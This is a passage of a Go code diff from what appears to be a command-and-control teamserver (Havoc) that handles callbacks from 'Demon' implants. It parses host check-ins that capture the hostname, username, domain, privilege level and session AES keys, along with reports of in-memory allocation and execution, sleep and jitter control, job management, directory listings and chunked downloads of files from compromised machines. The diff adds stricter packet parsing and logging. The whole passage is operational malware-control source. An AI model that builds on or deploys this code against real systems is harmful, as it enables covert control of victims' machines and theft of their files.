+				a.Info.SleepDelay   = SleepDelay
+				a.Info.SleepJitter  = SleepJitter
+				a.Info.KillDate     = KillDate
+				a.Info.WorkingHours = WorkingHours
+
+				// a.Info.ExternalIP 	= strings.Split(connection.RemoteAddr().String(), ":")[0]
+				// a.Info.Listener 	= t.Name
+
+				switch ProcessArch {
+
+				case PROCESS_ARCH_UNKNOWN:
+					a.Info.ProcessArch = "Unknown"
+					break
+
+				case PROCESS_ARCH_X64:
+					a.Info.ProcessArch = "x64"
+					break
+
+				case PROCESS_ARCH_X86:
+					a.Info.ProcessArch = "x86"
+					break
+
+				case PROCESS_ARCH_IA64:
+					a.Info.ProcessArch = "IA64"
+					break
+
+				default:
+					a.Info.ProcessArch = "Unknown"
+					break
+
 				}
-			)
 
-			DemonID = Parser.ParseInt32()
-			logger.Debug(fmt.Sprintf("Parsed DemonID: %x", DemonID))
+				a.Info.OSVersion = getWindowsVersionString(OsVersion)
 
-			if Parser.Length() >= 4 {
-				Hostname = common.StripNull(string(Parser.ParseBytes()))
-			} else {
-				Message["Type"] = "Info"
-				Message["Message"] = "Failed to parse agent request"
-				goto SendMessage
-			}
+				switch OsArch {
+				case 0:
+					a.Info.OSArch = "x86"
+				case 9:
+					a.Info.OSArch = "x64/AMD64"
+				case 5:
+					a.Info.OSArch = "ARM"
+				case 12:
+					a.Info.OSArch = "ARM64"
+				case 6:
+					a.Info.OSArch = "Itanium-based"
+				default:
+					a.Info.OSArch = "Unknown (" + strconv.Itoa(OsArch) + ")"
+				}
 
-			if Parser.Length() >= 4 {
-				Username = common.StripNull(string(Parser.ParseBytes()))
-			} else {
-				Message["Type"] = "Info"
-				Message["Message"] = "Failed to parse agent request"
-				goto SendMessage
-			}
+				a.Info.Elevated = "false"
+				if Elevated == 1 {
+					a.Info.Elevated = "true"
+				}
 
-			if Parser.Length() >= 4 {
-				DomainName = common.StripNull(string(Parser.ParseBytes()))
-			} else {
-				Message["Type"] = "Info"
-				Message["Message"] = "Failed to parse agent request"
-				goto SendMessage
-			}
+				process := strings.Split(ProcessName, "\\")
 
-			if Parser.Length() >= 4 {
-				InternalIP = common.StripNull(string(Parser.ParseBytes()))
-			} else {
-				Message["Type"] = "Info"
-				Message["Message"] = "Failed to parse agent request"
-				goto SendMessage
-			}
+				a.Info.ProcessName = process[len(process)-1]
+				a.Info.ProcessPID = ProcessPID
+				a.Info.ProcessPPID = ProcessPPID
+				a.Info.ProcessPath = ProcessName
 
-			ProcessName = common.StripNull(string(Parser.ParseBytes()))
-			ProcessPID = Parser.ParseInt32()
-			ProcessPPID = Parser.ParseInt32()
-			ProcessArch = Parser.ParseInt32()
-			Elevated = Parser.ParseInt32()
-			OsVersion = []int{Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32()}
-			OsArch = Parser.ParseInt32()
-			SleepDelay = Parser.ParseInt32()
+				a.SessionDir = logr.LogrInstance.AgentPath + "/" + a.NameID
 
-			Session.Active = true
-
-			Session.NameID = fmt.Sprintf("%x", DemonID)
-			Session.Info.MagicValue = MagicValue
-			Session.Info.FirstCallIn = a.Info.FirstCallIn
-			Session.Info.LastCallIn = a.Info.LastCallIn
-			Session.Info.Hostname = Hostname
-			Session.Info.DomainName = DomainName
-			Session.Info.Username = Username
-			Session.Info.InternalIP = InternalIP
-			Session.Info.SleepDelay = SleepDelay
-
-			// Session.Info.ExternalIP 	= strings.Split(connection.RemoteAddr().String(), ":")[0]
-			// Session.Info.Listener 	= t.Name
-
-			switch ProcessArch {
-
-			case PROCESS_ARCH_UNKNOWN:
-				Session.Info.ProcessArch = "Unknown"
-				break
-
-			case PROCESS_ARCH_X64:
-				Session.Info.ProcessArch = "x64"
-				break
-
-			case PROCESS_ARCH_X86:
-				Session.Info.ProcessArch = "x86"
-				break
-
-			case PROCESS_ARCH_IA64:
-				Session.Info.ProcessArch = "IA64"
-				break
-
-			default:
-				Session.Info.ProcessArch = "Unknown"
-				break
-
-			}
-
-			Session.Info.OSVersion = getWindowsVersionString(OsVersion)
-
-			switch OsArch {
-			case 0:
-				Session.Info.OSArch = "x86"
-			case 9:
-				Session.Info.OSArch = "x64/AMD64"
-			case 5:
-				Session.Info.OSArch = "ARM"
-			case 12:
-				Session.Info.OSArch = "ARM64"
-			case 6:
-				Session.Info.OSArch = "Itanium-based"
-			default:
-				Session.Info.OSArch = "Unknown (" + strconv.Itoa(OsArch) + ")"
-			}
-
-			Session.Info.Elevated = "false"
-			if Elevated == 1 {
-				Session.Info.Elevated = "true"
-			}
-
-			process := strings.Split(ProcessName, "\\")
-
-			Session.Info.ProcessName = process[len(process)-1]
-			Session.Info.ProcessPID = ProcessPID
-			Session.Info.ProcessPPID = ProcessPPID
-			Session.Info.ProcessPath = ProcessName
-
-			Session.SessionDir = logr.LogrInstance.AgentPath + "/" + Session.NameID
-
-			Message["Output"] = fmt.Sprintf(
-				"\n"+
-					"Teamserver:\n"+
-					"  - Session Path       : %v\n"+
+				Message["Output"] = fmt.Sprintf(
 					"\n"+
-					"Meta Data:\n"+
-					"  - Agent ID           : %v\n"+
-					"  - Magic Value        : %x\n"+
-					"  - First Call In      : %v\n"+
-					"  - Last  Call In      : %v\n"+
-					"  - AES Key            : %v\n"+
-					"  - AES IV             : %v\n"+
-					"  - Sleep Delay        : %v\n"+
-					"\n"+
-					"Host Info:\n"+
-					"  - Host Name          : %v\n"+
-					"  - User Name          : %v\n"+
-					"  - Domain Name        : %v\n"+
-					"  - Internal IP        : %v\n"+
-					"\n"+
-					"Process Info:\n"+
-					"  - Process Name       : %v\n"+
-					"  - Process Arch       : %v\n"+
-					"  - Process ID         : %v\n"+
-					// "  - Process Parent ID  : %v\n" +
-					"  - Process Path       : %v\n"+
-					"  - Process Elevated   : %v\n"+
-					"\n"+
-					"Operating System:\n"+
-					"  - Version            : %v\n"+
-					"  - Build              : %v.%v.%v.%v.%v\n"+
-					"  - Arch               : %v\n"+
-					"",
+						"Teamserver:\n"+
+						"  - Session Path       : %v\n"+
+						"\n"+
+						"Meta Data:\n"+
+						"  - Agent ID           : %v\n"+
+						"  - Magic Value        : %x\n"+
+						"  - First Call In      : %v\n"+
+						"  - Last  Call In      : %v\n"+
+						"  - AES Key            : %v\n"+
+						"  - AES IV             : %v\n"+
+						"  - Sleep Delay        : %v\n"+
+						"  - Sleep Jitter       : %v\n"+
+						"\n"+
+						"Host Info:\n"+
+						"  - Host Name          : %v\n"+
+						"  - User Name          : %v\n"+
+						"  - Domain Name        : %v\n"+
+						"  - Internal IP        : %v\n"+
+						"\n"+
+						"Process Info:\n"+
+						"  - Process Name       : %v\n"+
+						"  - Process Arch       : %v\n"+
+						"  - Process ID         : %v\n"+
+						//"  - Process Parent ID  : %v\n" +
+						"  - Process Path       : %v\n"+
+						"  - Process Elevated   : %v\n"+
+						"\n"+
+						"Operating System:\n"+
+						"  - Version            : %v\n"+
+						"  - Build              : %v.%v.%v.%v.%v\n"+
+						"  - Arch               : %v\n"+
+						"",
 
-				// Teamserver
-				Session.SessionDir,
+					// Teamserver
+					a.SessionDir,
 
-				// Meta Data
-				Session.NameID,
-				Session.Info.MagicValue,
-				Session.Info.FirstCallIn,
-				Session.Info.LastCallIn,
-				hex.EncodeToString(Session.Encryption.AESKey),
-				hex.EncodeToString(Session.Encryption.AESIv),
-				Session.Info.SleepDelay,
+					// Meta Data
+					a.NameID,
+					a.Info.MagicValue,
+					a.Info.FirstCallIn,
+					a.Info.LastCallIn,
+					hex.EncodeToString(a.Encryption.AESKey),
+					hex.EncodeToString(a.Encryption.AESIv),
+					a.Info.SleepDelay,
+					a.Info.SleepJitter,
 
-				// Host info
-				Session.Info.Hostname,
-				Session.Info.Username,
-				Session.Info.DomainName,
-				Session.Info.InternalIP,
+					// Host info
+					a.Info.Hostname,
+					a.Info.Username,
+					a.Info.DomainName,
+					a.Info.InternalIP,
 
-				// Process Info
-				Session.Info.ProcessName,
-				Session.Info.ProcessArch,
-				Session.Info.ProcessPID,
-				Session.Info.ProcessPath,
-				Session.Info.Elevated,
+					// Process Info
+					a.Info.ProcessName,
+					a.Info.ProcessArch,
+					a.Info.ProcessPID,
+					//a.Info.ProcessPPID,
+					a.Info.ProcessPath,
+					a.Info.Elevated,
 
-				// Operating System Info
-				Session.Info.OSVersion,
-				OsVersion[0], OsVersion[1], OsVersion[2], OsVersion[3], OsVersion[4],
-				Session.Info.OSArch,
+					// Operating System Info
+					a.Info.OSVersion,
+					OsVersion[0], OsVersion[1], OsVersion[2], OsVersion[3], OsVersion[4],
+					a.Info.OSArch,
 
-				// TODO: add Optional data too
-			)
+					// TODO: add Optional data too
+				)
 
-			Session = nil
+				teamserver.AgentUpdate(a)
+				a.RequestCompleted(RequestID)
+			} else {
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CHECKIN, Invalid packet", AgentID))
+			}
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CHECKIN, Invalid packet", AgentID))
 		}
 
-	SendMessage:
 		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
 
 		break
 
 	case DEMON_INFO:
-		var (
-			InfoID = int(Parser.ParseInt32())
-			Output = make(map[string]string)
-		)
-
-		Output["Type"] = "Info"
-
-		switch InfoID {
-		case DEMON_INFO_MEM_ALLOC:
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 			var (
-				MemPointer   = Parser.ParseInt32()
-				MemSize      = Parser.ParseInt32()
-				ProtectionId = Parser.ParseInt32()
-				Protection   string
+				InfoID = int(Parser.ParseInt32())
+				Output = make(map[string]string)
 			)
 
-			if s, ok := win32.Protections[int(ProtectionId)]; ok {
-				Protection = s[1]
-			} else {
-				Protection = "UNKNOWN"
+			Output["Type"] = "Info"
+
+			switch InfoID {
+			case DEMON_INFO_MEM_ALLOC:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadPointer, parser.ReadInt32, parser.ReadInt32}) {
+					var (
+						MemPointer   = Parser.ParsePointer()
+						MemSize      = Parser.ParseInt32()
+						ProtectionId = Parser.ParseInt32()
+						Protection   string
+					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - DEMON_INFO_MEM_ALLOC, MemPointer: %x, MemSize: %x, ProtectionId: %d", AgentID, MemPointer, MemSize, ProtectionId))
+
+					if s, ok := win32.Protections[int(ProtectionId)]; ok {
+						Protection = s[1]
+					} else {
+						Protection = "UNKNOWN"
+					}
+
+					Output["Message"] = fmt.Sprintf("Memory Allocated : Pointer:[0x%x] Size:[%d] Protection:[%v]", MemPointer, MemSize, Protection)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - DEMON_INFO_MEM_ALLOC, Invalid packet", AgentID))
+				}
+
+				break
+
+			case DEMON_INFO_MEM_EXEC:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadPointer, parser.ReadInt32}) {
+
+					var (
+						MemFunction = Parser.ParsePointer()
+						ThreadId    = Parser.ParseInt32()
+					)
+					
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - DEMON_INFO_MEM_EXEC, MemFunction: %x, ThreadId: %d", AgentID, MemFunction, ThreadId))
+
+					Output["Message"] = fmt.Sprintf("Memory Executed  : Function:[0x%x] ThreadId:[%d]", MemFunction, ThreadId)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - DEMON_INFO_MEM_EXEC, Invalid packet", AgentID))
+				}
+
+				break
+
+			case DEMON_INFO_MEM_PROTECT:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadPointer, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
+					var (
+						Memory        = Parser.ParsePointer()
+						MemorySize    = Parser.ParseInt32()
+						OldProtection = Parser.ParseInt32()
+						Protection    = Parser.ParseInt32()
+						ProcString    string
+					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - DEMON_INFO_MEM_PROTECT, Memory: %x, MemorySize: %x, OldProtection: %d, Protection: %d", AgentID, Memory, MemorySize, OldProtection, Protection))
+
+					if s, ok := win32.Protections[OldProtection]; ok {
+						ProcString = s[1] + " -> "
+					} else {
+						ProcString = "UNKNOWN" + " -> "
+					}
+
+					if s, ok := win32.Protections[Protection]; ok {
+						ProcString += s[1]
+					} else {
+						ProcString += "UNKNOWN"
+					}
+
+					Output["Message"] = fmt.Sprintf("Memory Protection: Memory:[0x%x] Size:[%d] Protection[%v]", Memory, MemorySize, ProcString)
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - DEMON_INFO_MEM_PROTECT, Invalid packet", AgentID))
+				}
+
+				break
+
+			default:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO - UNKNOWN (%d)", AgentID, InfoID))
 			}
 
-			Output["Message"] = fmt.Sprintf("Memory Allocated : Pointer:[0x%x] Size:[%d] Protection:[%v]", MemPointer, MemSize, Protection)
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+			a.RequestCompleted(RequestID)
 			break
-
-		case DEMON_INFO_MEM_EXEC:
-			var (
-				MemFunction = Parser.ParseInt32()
-				ThreadId    = Parser.ParseInt32()
-			)
-
-			Output["Message"] = fmt.Sprintf("Memory Executed  : Function:[0x%x] ThreadId:[%d]", MemFunction, ThreadId)
-			break
-
-		case DEMON_INFO_MEM_PROTECT:
-			var (
-				Memory        = Parser.ParseInt32()
-				MemorySize    = Parser.ParseInt32()
-				OldProtection = Parser.ParseInt32()
-				Protection    = Parser.ParseInt32()
-				ProcString    string
-			)
-
-			if s, ok := win32.Protections[OldProtection]; ok {
-				ProcString = s[1] + " -> "
-			} else {
-				ProcString = "UNKNOWN" + " -> "
-			}
-
-			if s, ok := win32.Protections[Protection]; ok {
-				ProcString += s[1]
-			} else {
-				ProcString += "UNKNOWN"
-			}
-
-			Output["Message"] = fmt.Sprintf("Memory Protection: Memory:[0x%x] Size:[%d] Protection[%v]", Memory, MemorySize, ProcString)
-			break
-
-		case DEMON_INFO_PROC_CREATE:
-			var (
-				Path = string(Parser.ParseBytes())
-				PID  = Parser.ParseInt32()
-			)
-
-			Output["Message"] = fmt.Sprintf("Process started: Path:[%v] ProcessID:[%v]", Path, PID)
-			break
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INFO, invalid packet", AgentID))
 		}
 
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
-		break
-
 	case COMMAND_SLEEP:
-		var Output = make(map[string]string)
 
-		a.Info.SleepDelay = Parser.ParseInt32()
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
+			var Output = make(map[string]string)
 
-		Output["Type"] = "Good"
-		Output["Message"] = fmt.Sprintf("Set sleep interval to %v seconds", a.Info.SleepDelay)
+			a.Info.SleepDelay  = Parser.ParseInt32()
+			a.Info.SleepJitter = Parser.ParseInt32()
+			teamserver.AgentUpdate(a)
 
-		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SLEEP, SleepDelay: %d, SleepJitter: %d", AgentID, a.Info.SleepDelay, a.Info.SleepJitter))
+
+			Output["Type"] = "Good"
+			Output["Message"] = fmt.Sprintf("Set sleep interval to %v seconds with %v%% jitter", a.Info.SleepDelay, a.Info.SleepJitter)
+			a.RequestCompleted(RequestID)
+
+			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Output)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_SLEEP, Invalid packet", AgentID))
+		}
 
 		break
 
 	case COMMAND_JOB:
 		var Message = make(map[string]string)
 
-		if Parser.Length() >= 4 {
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 
 			var SubCommand = Parser.ParseInt32()
 
 			switch SubCommand {
 
-			case 0x1:
+			case DEMON_COMMAND_JOB_LIST:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_LIST", AgentID))
 				var Output string
 
 				Output += fmt.Sprintf(" %-6s  %-13s  %-5s\n", "Job ID", "Type", "State")
 				Output += fmt.Sprintf(" %-6s  %-13s  %-5s\n", "------", "----", "-----")
 
-				if Parser.Length() > 4 {
+				for Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32, parser.ReadInt32}) {
 					var (
 						JobID int
 						Type  int
@@ -2115,12 +2529,15 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 
 				break
 
-			case 0x2:
-				if Parser.Length() > 4 {
+			case DEMON_COMMAND_JOB_SUSPEND:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
 					var (
 						JobID   = Parser.ParseInt32()
 						Success = Parser.ParseInt32()
 					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_SUSPEND, JobID: %v, Success: %d", AgentID, JobID, Success))
 
 					if Success == win32.TRUE {
 						Message["Type"] = "Good"
@@ -2130,15 +2547,21 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 						Message["Message"] = fmt.Sprintf("Failed to suspended job %v", JobID)
 					}
 
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_SUSPEND, Invalid packet", AgentID))
 				}
+
 				break
 
-			case 0x3:
-				if Parser.Length() > 4 {
+			case DEMON_COMMAND_JOB_RESUME:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
 					var (
 						JobID   = Parser.ParseInt32()
 						Success = Parser.ParseInt32()
 					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_RESUME, JobID: %v, Success: %d", AgentID, JobID, Success))
 
 					if Success == win32.TRUE {
 						Message["Type"] = "Good"
@@ -2147,15 +2570,21 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 						Message["Type"] = "Error"
 						Message["Message"] = fmt.Sprintf("Failed to resumed job %v", JobID)
 					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_RESUME, Invalid packet", AgentID))
 				}
+
 				break
 
-			case 0x4:
-				if Parser.Length() > 4 {
+			case DEMON_COMMAND_JOB_KILL_REMOVE:
+
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}) {
 					var (
 						JobID   = Parser.ParseInt32()
 						Success = Parser.ParseInt32()
 					)
+
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_KILL_REMOVE, JobID: %v, Success: %d", AgentID, JobID, Success))
 
 					if Success == win32.TRUE {
 						Message["Type"] = "Good"
@@ -2164,313 +2593,406 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 						Message["Type"] = "Error"
 						Message["Message"] = fmt.Sprintf("Failed to kill job %v", JobID)
 					}
+				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_KILL_REMOVE, Invalid packet", AgentID))
 				}
+
 				break
+
+			case DEMON_COMMAND_JOB_DIED:
+
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - DEMON_COMMAND_JOB_DIED", AgentID))
+
+				// this message is sent by the agent when a created process dies
+				a.RequestCompleted(RequestID)
+
+				break
+
+			default:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB - UNKNOWN (%d)", AgentID, SubCommand))
 			}
 
 			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+			a.RequestCompleted(RequestID)
 			break
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_JOB, Invalid packet", AgentID))
 		}
 
 	case COMMAND_FS:
-		logger.Debug("COMMAND_FS")
-		var (
-			SubCommand = Parser.ParseInt32()
-			Output     = make(map[string]string)
-		)
-
-		switch SubCommand {
-		case 1:
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 			var (
-				Exp32    = Parser.ParseInt32()
-				Path     = Parser.ParseBytes()
-				Dir      string
-				DirMap   = make(map[string]any)
-				DirArr   []map[string]string
-				Explorer = false
+				SubCommand = Parser.ParseInt32()
+				Output     = make(map[string]string)
 			)
 
-			if Parser.Length() > 0 {
-				if Exp32 == win32.TRUE {
-					Explorer = true
-				}
+			switch SubCommand {
+			case DEMON_COMMAND_FS_DIR:
+				logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DIR", AgentID))
+				if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes}) {
 
-				if !Explorer {
-					Dir += "\n"
-					Dir += fmt.Sprintf(" %-12s %-8s %-20s  %s\n", "Size", "Type", "Last Modified      ", "Name")
-					Dir += fmt.Sprintf(" %-12s %-8s %-20s  %s\n", "----", "----", "-------------------", "----")
-				}
-
-				for Parser.Length() >= 4 {
 					var (
-						IsDir            = Parser.ParseInt32()
-						FileSize         = Parser.ParseInt64()
-						LastAccessDay    = Parser.ParseInt32()
-						LastAccessMonth  = Parser.ParseInt32()
-						LastAccessYear   = Parser.ParseInt32()
-						LastAccessSecond = Parser.ParseInt32()
-						LastAccessMinute = Parser.ParseInt32()
-						LastAccessHour   = Parser.ParseInt32()
-						FileName         = Parser.ParseBytes()
-
-						Size         string
-						Type         string
-						LastModified string
-						Name         string
+						Exp32    = Parser.ParseInt32()
+						Path     = Parser.ParseUTF16String()
+						Dir      string
+						DirMap   = make(map[string]any)
+						DirArr   []map[string]string
+						Explorer = false
 					)
 
-					Type = "file"
-					Size = ""
-					if IsDir == win32.TRUE {
-						Type = "dir"
-					} else {
-						Size = common.ByteCountSI(int64(FileSize))
-					}
-
-					LastModified = fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", LastAccessDay, LastAccessMonth, LastAccessYear, LastAccessSecond, LastAccessMinute, LastAccessHour)
-					Name = common.DecodeUTF16(FileName)
-
-					// ignore these. not needed
-					if Name == "." || Name == ".." || Name == "" {
-						continue
+					if Exp32 == win32.TRUE {
+						Explorer = true
 					}
 
 					if !Explorer {
-						Dir += fmt.Sprintf(" %-12s %-8s %-20s  %-8v\n", Size, Type, LastModified, Name)
-					} else {
-						DirArr = append(DirArr, map[string]string{
-							"Type":     Type,
-							"Size":     Size,
-							"Modified": LastModified,
-							"Name":     Name,
-						})
+						Dir += "\n"
+						Dir += fmt.Sprintf(" %-12s %-8s %-20s  %s\n", "Size", "Type", "Last Modified      ", "Name")
+						Dir += fmt.Sprintf(" %-12s %-8s %-20s  %s\n", "----", "----", "-------------------", "----")
 					}
 
-				}
-
-				if !Explorer {
-					Output["Type"] = "Info"
-					Output["Message"] = fmt.Sprintf("List Directory: %v", common.DecodeUTF16(Path))
-					Output["Output"] = Dir
-				} else {
-					DirMap["Path"] = []byte(common.DecodeUTF16(Path))
-					DirMap["Files"] = DirArr
-
-					DirJson, err := json.Marshal(DirMap)
-					if err != nil {
-						logger.Debug("[Error] " + err.Error())
-					} else {
-						Output["MiscType"] = "FileExplorer"
-						Output["MiscData"] = base64.StdEncoding.EncodeToString(DirJson)
-					}
-				}
-			} else {
-				Output["Type"] = "Error"
-				Output["Message"] = "No files/folders at specified path"
-			}
-
-			break
-
-		/* Download */
-		case 2:
-
-			/*
-			 * Download Header:
-			 *  [ Mode      ] Open ( 0 ), Write ( 1 ) or Close ( 2 )
-			 *  [ File ID   ] Download File ID
-			 *
-			 * Data (Open):
-			 *  [ File Size ]
-			 *  [ File Name ]
-			 *
-			 * Data (Write)
-			 *  [ Chunk Data ] Size + FileChunk
-			 *
-			 * Data (Close):
-			 *  [ File Name ]
-			 *  [  Reason   ] Removed or Finished
-			 * */
-
-			if Parser.Length() >= 8 {
-				var (
-					Mode   = Parser.ParseInt32()
-					FileID = Parser.ParseInt32()
-				)
-
-				switch Mode {
-
-				/* File Open */
-				case 0x0:
-					logger.Debug(fmt.Sprintf("Download open FileID:[%x]", FileID))
-
-					if Parser.Length() >= 8 {
+					for Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadInt64, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadBytes}) {
 						var (
-							FileSize = Parser.ParseInt32()
-							FileName = common.DecodeUTF16(Parser.ParseBytes())
-							Size     = common.ByteCountSI(int64(FileSize))
+							IsDir            = Parser.ParseInt32()
+							FileSize         = Parser.ParseInt64()
+							LastAccessDay    = Parser.ParseInt32()
+							LastAccessMonth  = Parser.ParseInt32()
+							LastAccessYear   = Parser.ParseInt32()
+							LastAccessSecond = Parser.ParseInt32()
+							LastAccessMinute = Parser.ParseInt32()
+							LastAccessHour   = Parser.ParseInt32()
+							FileName         = Parser.ParseUTF16String()
+
+							Size         string
+							Type         string
+							LastModified string
+							Name         string
 						)
 
+						Type = "file"
+						Size = ""
+						if IsDir == win32.TRUE {
+							Type = "dir"
+						} else {
+							Size = common.ByteCountSI(int64(FileSize))
+						}
+
+						LastModified = fmt.Sprintf("%02d/%02d/%d %02d:%02d:%02d", LastAccessDay, LastAccessMonth, LastAccessYear, LastAccessSecond, LastAccessMinute, LastAccessHour)
+						Name = FileName
+
+						// ignore these. not needed
+						if Name == "." || Name == ".." || Name == "" {
+							continue
+						}
+
+						if !Explorer {
+							Dir += fmt.Sprintf(" %-12s %-8s %-20s  %-8v\n", Size, Type, LastModified, Name)
+						} else {
+							DirArr = append(DirArr, map[string]string{
+								"Type":     Type,
+								"Size":     Size,
+								"Modified": LastModified,
+								"Name":     Name,
+							})
+						}
+
+					}
+
+					if !Explorer {
 						Output["Type"] = "Info"
-						Output["Message"] = fmt.Sprintf("Started download of file: %v [%v]", FileName, Size)
+						Output["Message"] = fmt.Sprintf("List Directory: %v", Path)
+						Output["Output"] = Dir
+					} else {
+						DirMap["Path"] = []byte(Path)
+						DirMap["Files"] = DirArr
 
-						if err := a.DownloadAdd(FileID, FileName, FileSize); err != nil {
-							Output["Type"] = "Error"
-							Output["Message"] = err.Error()
+						DirJson, err := json.Marshal(DirMap)
+						if err != nil {
+							logger.Debug("[Error] " + err.Error())
 						} else {
-							Output["MiscType"] = "download"
-							Output["MiscData2"] = base64.StdEncoding.EncodeToString([]byte(FileName)) + ";" + Size
+							Output["MiscType"] = "FileExplorer"
+							Output["MiscData"] = base64.StdEncoding.EncodeToString(DirJson)
 						}
 					}
-
-					break
-
-				case 0x1:
-					logger.Debug(fmt.Sprintf("Download write FileID:[%v]", FileID))
-
-					if Parser.Length() >= 4 {
-						var FileChunk = Parser.ParseBytes()
-
-						a.DownloadWrite(FileID, FileChunk)
-					}
-
-					break
-
-				case 0x2:
-					logger.Debug(fmt.Sprintf("Download close FileID:[%v]", FileID))
-
-					if Parser.Length() >= 4 {
-						var (
-							FileName string
-							Reason   = Parser.ParseInt32()
-						)
-
-						if len(a.Downloads) > 0 {
-							var download = a.DownloadGet(FileID)
-							if download != nil {
-								FileName = download.FilePath
-							}
-
-							if Reason == 0x0 {
-								Output["Type"] = "Good"
-								Output["Message"] = fmt.Sprintf("Finished download of file: %v", FileName)
-
-								a.DownloadClose(FileID)
-							} else if Reason == 0x1 {
-								Output["Type"] = "Info"
-								Output["Message"] = fmt.Sprintf("Download has been removed: %v", FileName)
-
-								a.DownloadClose(FileID)
-							}
-						} else {
-							/* TODO: handle this error. or simply ignore this ? */
-						}
-
-					}
-
-					break
-				}
-			} else {
-				logger.Debug("Parser.Length() < 8")
-			}
-
-			break
-
-		case 3:
-
-			if Parser.Length() >= 8 {
-				var (
-					FileSize = Parser.ParseInt32()
-					FileName = Parser.ParseBytes()
-				)
-
-				Output["Type"] = "Info"
-				Output["Message"] = fmt.Sprintf("Uploaded file: %v (%v)", string(FileName), FileSize)
-			} else {
-				Output["Type"] = "Error"
-				Output["Message"] = "Failed to parse FS::Upload response"
-			}
-
-			break
-
-		case 4:
-			var Path = common.DecodeUTF16(Parser.ParseBytes())
-
-			Output["Type"] = "Info"
-			Output["Message"] = fmt.Sprintf("Changed directory: %v", Path)
-
-			break
-
-		case 5:
-			var (
-				IsDir = Parser.ParseInt32()
-				Path  = common.DecodeUTF16(Parser.ParseBytes())
-			)
-
-			Output["Type"] = "Info"
-
-			if IsDir == win32.TRUE {
-				Output["Message"] = fmt.Sprintf("Removed directory: %v", string(Path))
-			} else {
-				Output["Message"] = fmt.Sprintf("Removed file: %v", string(Path))
-			}
-			break
-
-		case 6:
-			var Path = common.DecodeUTF16(Parser.ParseBytes())
-
-			Output["Type"] = "Info"
-			Output["Message"] = fmt.Sprintf("Created directory: %v", string(Path))
-
-			break
-
-		case 7:
-			if Parser.Length() > 4 {
-				var (
-					Success  = Parser.ParseInt32()
-					PathFrom = common.DecodeUTF16(Parser.ParseBytes())
-					PathTo   = common.DecodeUTF16(Parser.ParseBytes())
-				)
-
-				if Success == win32.TRUE {
-					Output["Type"] = "Good"
-					Output["Message"] = fmt.Sprintf("Successful copied file %v to %v", PathFrom, PathTo)
+					a.RequestCompleted(RequestID)
 				} else {
+					logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_FS - DEMON_COMMAND_FS_DIR, Invalid packet", AgentID))
 					Output["Type"] = "Error"
